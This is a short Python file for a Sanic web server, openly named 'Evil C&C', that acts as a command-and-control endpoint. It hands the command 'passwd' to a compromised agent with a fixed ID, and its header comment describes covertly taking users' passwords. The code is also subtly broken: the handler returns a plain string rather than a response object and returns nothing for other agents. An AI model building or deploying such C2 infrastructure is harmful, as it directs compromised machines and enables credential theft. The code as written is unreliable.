# a example of a Sanic Server, when client access a server we hide and take advantage of retrieve user/password
#!/usr/bin/env python3
from sanic import Sanic
from sanic.response import json

app = Sanic(name="Evil C&C")

@app.post("/newcommand")
async def test(request):
	# SELECT * FROM commands WHERE agentID = request.json['agentID'] AND new = True
	if request.json['agentID'] == "X1234":
		return "passwd"
	#print(request.json)
	#return json({"hello": "world"})

if __name__=="__main__":
	app.run(host="0.0.0.0", port=8000)
